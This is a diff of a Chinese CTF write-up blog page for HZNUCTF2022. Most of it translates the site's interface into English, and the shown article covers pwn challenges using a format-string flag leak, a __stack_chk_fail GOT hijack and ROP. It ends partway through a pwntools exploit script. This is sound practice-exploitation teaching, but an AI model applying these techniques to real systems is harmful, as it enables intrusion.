@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
@@ -17,15 +17,16 @@
 
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"4xwi11.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"right","width":320,"display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":"utterances","storage":true,"lazyload":false,"nav":null,"activeClass":"utterances"},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false}}</script><script src="/js/config.js"></script>
-<meta name="description" content="感谢@Anza师傅出题，fuck @Scr1pt">
+<script class="next-config" data-name="main" type="application/json">{"hostname":"4xwi11.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"right","width":320,"display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":"utterances","storage":true,"lazyload":false,"nav":null,"activeClass":"utterances"},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="thanks@Anza, fuck@Scr1pt">
 <meta property="og:type" content="article">
 <meta property="og:title" content="20220409-HZNUCTF">
 <meta property="og:url" content="https://4xwi11.github.io/posts/8de4998e/index.html">
 <meta property="og:site_name" content="4XWi11&#39;s Blog">
-<meta property="og:description" content="感谢@Anza师傅出题，fuck @Scr1pt">
-<meta property="og:locale" content="zh_CN">
+<meta property="og:description" content="thanks@Anza, fuck@Scr1pt">
+<meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220401165432369.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220401162341374.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220401164547508.png">
@@ -37,7 +38,6 @@
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220402184329478.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220402192619243.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220402202247045.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220402194830223.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220402201014368.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220402193856536.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220402194133289.png">
@@ -84,12 +84,8 @@
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220418150814333.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220418151921671.png">
 <meta property="article:published_time" content="2022-04-18T11:24:56.000Z">
-<meta property="article:modified_time" content="2022-04-24T14:27:04.446Z">
+<meta property="article:modified_time" content="2022-08-31T15:38:27.310Z">
 <meta property="article:author" content="4XWi11">
-<meta property="article:tag" content="DFA">
-<meta property="article:tag" content="hijack __stack__chk_fail">
-<meta property="article:tag" content="花指令">
-<meta property="article:tag" content="抬栈">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220401165432369.png">
 
@@ -98,7 +94,7 @@
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://4xwi11.github.io/posts/8de4998e/","path":"posts/8de4998e/","title":"20220409-HZNUCTF"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://4xwi11.github.io/posts/8de4998e/","path":"posts/8de4998e/","title":"20220409-HZNUCTF"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
 <title>20220409-HZNUCTF | 4XWi11's Blog</title>
@@ -119,7 +115,7 @@
     <header class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏" role="button">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
         <span class="toggle-line"></span>
         <span class="toggle-line"></span>
         <span class="toggle-line"></span>
@@ -146,13 +142,12 @@
 
 <nav class="site-nav">
   <ul class="main-menu menu">
-        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
-        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fas fa-pray fa-fw"></i>关于</a></li>
-        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
-        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fas fa-pray fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
       <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
         </a>
       </li>
   </ul>
@@ -167,7 +162,7 @@
   </span>
   <div class="search-input-container">
     <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="搜索..." spellcheck="false"
+           placeholder="Searching..." spellcheck="false"
            type="search" class="search-input">
   </div>
   <span class="popup-btn-close" role="button">
@@ -197,17 +192,17 @@
     <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
-          文章目录
+          Table of Contents
         </li>
         <li class="sidebar-nav-overview">
-          站点概览
+          Overview
         </li>
       </ul>
 
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HZNUCTF2022-WP"><span class="nav-number">1.</span> <span class="nav-text">HZNUCTF2022 WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E8%B5%9B"><span class="nav-number">1.1.</span> <span class="nav-text">初赛</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn-seer-game"><span class="nav-number">1.1.1.</span> <span class="nav-text">pwn-seer_game</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn-wolf-game"><span class="nav-number">1.1.2.</span> <span class="nav-text">pwn-wolf_game</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">0x01 题目描述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">0x02 分析思路</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF1"><span class="nav-number">1.1.2.2.1.</span> <span class="nav-text">思路1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF2"><span class="nav-number">1.1.2.2.2.</span> <span class="nav-text">思路2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF3%EF%BC%88not-solve%EF%BC%89"><span class="nav-number">1.1.2.2.3.</span> <span class="nav-text">思路3（not solve）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto-%E3%81%8E%E3%82%93%E3%81%9F%E3%81%BE9"><span class="nav-number">1.1.3.</span> <span class="nav-text">crypto-ぎんたま9</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%B3%E8%B5%9B"><span class="nav-number">1.2.</span> <span class="nav-text">决赛</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto-math1"><span class="nav-number">1.2.1.</span> <span class="nav-text">crypto-math1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto-D4C"><span class="nav-number">1.2.2.</span> <span class="nav-text">crypto-D4C</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto-SorM"><span class="nav-number">1.2.3.</span> <span class="nav-text">crypto-SorM</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Reference"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">Reference.</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-Just-Signin"><span class="nav-number">1.2.4.</span> <span class="nav-text">misc-Just-Signin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn-hunter-game%EF%BC%88not-solve%EF%BC%89"><span class="nav-number">1.2.5.</span> <span class="nav-text">pwn-hunter_game（not solve）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn-repairman"><span class="nav-number">1.2.6.</span> <span class="nav-text">pwn-repairman</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-fuckoff-easy-code"><span class="nav-number">1.2.7.</span> <span class="nav-text">re-fuckoff_easy_code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-virus"><span class="nav-number">1.2.8.</span> <span class="nav-text">re-virus</span></a></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9D%E8%B5%9B"><span class="nav-number">1.</span> <span class="nav-text">初赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">1.1.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#seer-game"><span class="nav-number">1.1.1.</span> <span class="nav-text">seer_game</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wolf-game"><span class="nav-number">1.1.2.</span> <span class="nav-text">wolf_game</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">分析思路</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF1"><span class="nav-number">1.1.2.2.1.</span> <span class="nav-text">思路1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF2"><span class="nav-number">1.1.2.2.2.</span> <span class="nav-text">思路2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF3%EF%BC%88not-solve%EF%BC%89"><span class="nav-number">1.1.2.2.3.</span> <span class="nav-text">思路3（not solve）</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-%E3%81%8E%E3%82%93%E3%81%9F%E3%81%BE9"><span class="nav-number">1.2.</span> <span class="nav-text">Crypto-ぎんたま9</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%B3%E8%B5%9B"><span class="nav-number">2.</span> <span class="nav-text">决赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">2.1.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#math1"><span class="nav-number">2.1.1.</span> <span class="nav-text">math1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#D4C"><span class="nav-number">2.1.2.</span> <span class="nav-text">D4C</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SorM"><span class="nav-number">2.1.3.</span> <span class="nav-text">SorM</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Reference"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">Reference</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-Just-Signin"><span class="nav-number">2.2.</span> <span class="nav-text">Misc-Just-Signin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn-1"><span class="nav-number">2.3.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hunter-game"><span class="nav-number">2.3.1.</span> <span class="nav-text">hunter_game</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#repairman"><span class="nav-number">2.3.2.</span> <span class="nav-text">repairman</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re"><span class="nav-number">2.4.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fuckoff-easy-code"><span class="nav-number">2.4.1.</span> <span class="nav-text">fuckoff_easy_code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#virus"><span class="nav-number">2.4.2.</span> <span class="nav-text">virus</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -216,25 +211,20 @@
     <img class="site-author-image" itemprop="image" alt="4XWi11"
       src="/images/avatar.png">
   <p class="site-author-name" itemprop="name">4XWi11</p>
-  <div class="site-description" itemprop="description">feiwu自进阶</div>
+  <div class="site-description" itemprop="description">They said don't play with idiots.🙃</div>
 </div>
 <div class="site-state-wrap site-overview-item animated">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">73</span>
-          <span class="site-state-item-name">日志</span>
+          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">10</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">54</span>
-        <span class="site-state-item-name">标签</span></a>
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">categories</span></a>
       </div>
   </nav>
 </div>
@@ -243,7 +233,7 @@
         <a href="https://github.com/4XWi11" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;4XWi11" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
-        <a href="https://blog.csdn.net/m0_49109277?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;m0_49109277?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fab fa-cuttlefish fa-fw"></i>CSDN</a>
+        <a href="/MTI0OTg0NzE2NQo" title="MTI0OTg0NzE2NQo → MTI0OTg0NzE2NQo"><i class="fab fa-qq fa-fw"></i>MTI0OTg0NzE2NQo</a>
       </span>
   </div>
   <div class="cc-license site-overview-item animated" itemprop="license">
@@ -282,7 +272,7 @@
 
         </div>
       </div>
-        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
           <i class="fa fa-arrow-up"></i>
           <span>0%</span>
         </div>
@@ -314,13 +304,13 @@
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
     <link itemprop="mainEntityOfPage" href="https://4xwi11.github.io/posts/8de4998e/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
       <meta itemprop="name" content="4XWi11">
-      <meta itemprop="description" content="feiwu自进阶">
+      <meta itemprop="description" content="They said don't play with idiots.🙃">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -337,49 +327,49 @@
       <span class="post-meta-item-icon">
         <i class="far fa-calendar"></i>
       </span>
-      <span class="post-meta-item-text">发表于</span>
+      <span class="post-meta-item-text">Posted on</span>
 
-      <time title="创建时间：2022-04-18 19:24:56" itemprop="dateCreated datePublished" datetime="2022-04-18T19:24:56+08:00">2022-04-18</time>
+      <time title="Created: 2022-04-18 19:24:56" itemprop="dateCreated datePublished" datetime="2022-04-18T19:24:56+08:00">2022-04-18</time>
     </span>
       <span class="post-meta-item">
         <span class="post-meta-item-icon">
           <i class="far fa-calendar-check"></i>
         </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2022-04-24 22:27:04" itemprop="dateModified" datetime="2022-04-24T22:27:04+08:00">2022-04-24</time>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-08-31 23:38:27" itemprop="dateModified" datetime="2022-08-31T23:38:27+08:00">2022-08-31</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
       </span>
-      <span class="post-meta-item-text">分类于</span>
+      <span class="post-meta-item-text">In</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%A0%91%E5%93%A5%E8%AE%A9%E6%88%91%E5%A4%A9%E5%A4%A9%E5%86%99%E4%B9%8B%E6%88%91%E5%B0%B1%E4%B8%8D/" itemprop="url" rel="index"><span itemprop="name">树哥让我天天写之我就不</span></a>
+          <a href="/categories/tmpt/" itemprop="url" rel="index"><span itemprop="name">tmpt</span></a>
         </span>
     </span>
 
   
-    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
-      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="post-meta-item-text">Views: </span>
       <span id="busuanzi_value_page_pv"></span>
     </span>
     <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
+    <span class="post-meta-item" title="Symbols count in article">
       <span class="post-meta-item-icon">
         <i class="far fa-file-word"></i>
       </span>
-      <span class="post-meta-item-text">本文字数：</span>
+      <span class="post-meta-item-text">Symbols count in article: </span>
       <span>19k</span>
     </span>
-    <span class="post-meta-item" title="阅读时长">
+    <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>17 分钟</span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>17 mins.</span>
     </span>
 </div>
 
@@ -390,12 +380,10 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <blockquote>
-<p>感谢@Anza师傅出题，fuck @Scr1pt</p>
-</blockquote>
+        <p>thanks@Anza, fuck@Scr1pt</p>
 <span id="more"></span>
 
-<h1 id="HZNUCTF2022-WP"><a href="#HZNUCTF2022-WP" class="headerlink" title="HZNUCTF2022 WP"></a>HZNUCTF2022 WP</h1><h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><h3 id="pwn-seer-game"><a href="#pwn-seer-game" class="headerlink" title="pwn-seer_game"></a>pwn-seer_game</h3><p>例行查保护</p>
+<h1 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h1><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="seer-game"><a href="#seer-game" class="headerlink" title="seer_game"></a>seer_game</h3><p>例行查保护</p>
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220401165432369.png" alt="image-20220401165432369"></p>
 <p>IDA反编译，有个明显的格式化字符串漏洞，而且flag被写到了栈上，但是问题是输入的字符串长度最大为5，这么点根本不够任意地址读写</p>
 <p>不过这个问题不大，显然5就是为了<code>%10$s</code>这类的格式化字符串准备的。这样虽然不能任意地址，但是栈上的内容就对于我们不再透明，此外虽然不能直接看到偏移，那么就可以尝试一个一个把栈上的数据都读出来，直到读到flag内容</p>
@@ -408,12 +396,12 @@
 
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220401204256702.png" alt="image-20220401204256702"></p>
 <p>手动gdb了属于是，看到第10到13行，也就是flag了</p>
-<h3 id="pwn-wolf-game"><a href="#pwn-wolf-game" class="headerlink" title="pwn-wolf_game"></a>pwn-wolf_game</h3><p>知识点</p>
+<h3 id="wolf-game"><a href="#wolf-game" class="headerlink" title="wolf_game"></a>wolf_game</h3><p>知识点</p>
 <ul>
 <li><code>hijack __stack__chk_fail</code>新姿势</li>
 </ul>
 <p>经典ROP，美团的babyrop再现</p>
-<h4 id="0x01-题目描述"><a href="#0x01-题目描述" class="headerlink" title="0x01 题目描述"></a>0x01 题目描述</h4><p>64位，动态编译，开启了canary和NX保护，提供的libc版本为libc-2.23</p>
+<h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>64位，动态编译，开启了canary和NX保护，提供的libc版本为libc-2.23</p>
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220402183749797.png" alt="image-20220402183749797"></p>
 <p>IDA反编译逻辑如下</p>
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220402183946276.png" alt="image-20220402183946276"></p>
@@ -425,7 +413,7 @@
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220402192619243.png" alt="image-20220402192619243"></p>
 <p>一些one-gadget</p>
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220402202247045.png" alt="image-20220402202247045"></p>
-<h4 id="0x02-分析思路"><a href="#0x02-分析思路" class="headerlink" title="0x02 分析思路"></a>0x02 分析思路</h4><ul>
+<h4 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h4><ul>
 <li><p>第一点</p>
 <p>check显然是用C int有符号类型的范围无论是32位还是64位程序都为$[-\frac{2^{32}}{2},\ \frac{2^{32}}{2}-1]$即$[-2147483648,\ 2147483647]$，所以send<code>-2147483648</code>就好，在取反的时候由于int的<code>2147483648</code>就等于<code>-2147483648</code>，check通过</p>
 </li>
@@ -438,7 +426,9 @@
 </ul>
 <p>首先要绕过canary，这里显然不能输出和爆破，联系第二点的任意地址写，一种绕过方法就是劫持<code>__stack__chk_fail</code>，即在检测canary是否被改变时调用的函数。但这里没有后门，并不能劫持<code>__stack__chk_fail</code>直接get shell，所以接下就有2种思路</p>
 <h5 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h5><p>谢师傅说如果将<code>__stack__chk_fail</code>的got表改成<code>ret</code>就能绕过canary检测了。现在先假设就算能绕过了canary，但溢出距离实在太短辣，只能控制返回地址。另外在看逻辑的时候，main函数里输入的那个具有足够空间、没有栈溢出的buf肯定会引起一些想法。那么此时就要回想起几个月前的美团，想起谢师傅的教诲</p>
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220402194830223.png" alt="image-20220402194830223"></p>
+<blockquote>
+<p>多看看栈，说不定会有宝藏</p>
+</blockquote>
 <p>在main函数输入buf结束之后，buf是会滞留在栈上的（其实这里已经不能说是栈了，因为栈差不多都被弹空了，rsp已经来到了返回地址的位置，main函数的局部变量buf已经在栈底之下），如果将rop做进这里，<code>__stack__chk_fail</code>不是<code>ret</code>，而是<code>pop</code>，把不要的都pop掉直到<code>rsp</code>指向构造的第一句rop。先让我们看下当时的栈的情况：在<code>leave; ret</code>停下，如下图所示<code>AAAAAAAA</code>是输入的killed的buf的最后八个字节，下面那一串<code>4xwi11</code>则是main函数里往buf输入的，可以看到他们之间相隔两行数据，刚好可以用上面的<code>pop r14; pop r15; ret</code>来把它们弹出来，开始执行rop链</p>
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20220402201014368.png" alt="image-20220402201014368"></p>
 <p>然后动调看看绕过canary，栈溢出选择导向到killed</p>
@@ -479,7 +469,7 @@
 <p>先记下脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./wolf_game&quot;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;121.40.181.50&quot;, 10004)</span></span><br><span class="line">_elf = ELF(<span class="string">&quot;./wolf_game&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">stack_chk_fail = _elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line">puts_plt = _elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">read_got = _elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">ret_addr = <span class="number">0x400659</span></span><br><span class="line">kill_addr = <span class="number">0x400932</span></span><br><span class="line">killed_addr = <span class="number">0x4009D1</span></span><br><span class="line">pop_rdi = <span class="number">0x400b03</span></span><br><span class="line">pop_2 = <span class="number">0x400b00</span></span><br><span class="line"><span class="comment"># pop_3 = 0x400afe</span></span><br><span class="line">main_addr = <span class="number">0x4007F6</span></span><br><span class="line">bss_addr = <span class="number">0x602080</span></span><br><span class="line">lea_ret = <span class="number">0x400930</span></span><br><span class="line">pop_rbp = <span class="number">0x400760</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># STEP1. pass check</span></span><br><span class="line">payload1 = <span class="string">b&quot;-2147483648&quot;</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># STEP2. hijack 